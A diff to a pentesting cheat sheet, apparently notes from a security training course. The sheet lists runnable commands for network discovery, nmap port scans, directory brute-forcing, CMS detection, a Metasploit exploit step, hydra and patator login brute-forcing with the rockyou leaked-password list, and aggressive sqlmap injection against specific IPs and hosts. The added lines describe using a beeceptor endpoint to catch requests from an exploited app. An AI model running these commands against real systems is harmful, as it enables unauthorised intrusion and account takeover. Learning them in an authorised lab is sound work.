@@ -1,13 +1,19 @@
 Search network:
 sudo netdiscover -r 188.166.0.0/24
 
+------------------------------------------------------------------------------------------------------
+
 Scan services and open ports on machine:
 sudo nmap -sV -O 188.166.20.197
 sudo nmap -p 1-65535 -T4 -A -v 164.92.212.203
 
+------------------------------------------------------------------------------------------------------
+
 Find paths in website:
 dirbuster
 - choose wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+------------------------------------------------------------------------------------------------------
 
 CMS detection (scans WordPress, Joomla, Drupal etc):
 cmseek
@@ -22,6 +28,8 @@ show options
 set RHOSTS 192.168.0.183 (just an example)
 exploit
 
+------------------------------------------------------------------------------------------------------
+
 Brute force attack on login page (it works only with forms that post, not with ajax and json):
 sudo apt install seclists
 sudo tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz
@@ -29,12 +37,28 @@ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 188.166.20.197 -s 80 http-post-form "/login:username=^USER^&password=^PASS^:F=401"
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -u -f 188.166.20.197 -s 80 http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:H=Content-Type: application/json:F={\"message\"\:\"bad user name or password\"}"
 
+------------------------------------------------------------------------------------------------------
+
 Brute force attack on login page (with json):
 sudo apt install patator
 patator http_fuzz url="http://188.166.20.197/login" resolve=188.166.20.197:188.166.20.197 method=POST header='Content-Type: application/json' body='{"username":"FILE0","password":"FILE1"}' 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -x ignore:code=401 -t 50
 patator http_fuzz url="http://188.166.20.197/login" resolve=188.166.20.197:188.166.20.197 method=POST header='Content-Type: application/json' body="{\"username\":\"FILE0\",\"password\":\"FILE1\"}" 0=/usr/share/seclists/Usernames/top-usernames-shortlist.txt 1=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -x ignore:code=401 -t 50
 
+------------------------------------------------------------------------------------------------------
+
 SQL injections testing:
 sqlmap -u http://188.166.20.197/login --data="{\"username\":\"*\",\"password\":\"*\"}" --level=5 --risk=3 --ignore-code 401
 
 sqlmap -u http://hidden-app.security-training.pl/login --data="{\"email\":\"*\",\"password\":\"*\"}" --level=5 --risk=3
+
+------------------------------------------------------------------------------------------------------
+
+Quick mock server, when we need to intercept requests from the exploited app, when the exploited app needs to send a notification to a URL:
+    - https://beeceptor.com/
+
+For example create a free endpoint: mtdev.free.beeceptor.com
+Then pass the URL https://mtdev.free.beeceptor.com to the exploited app and watch the requests it makes to it:
+    - https://beeceptor.com/console/mtdev
+
+------------------------------------------------------------------------------------------------------
+
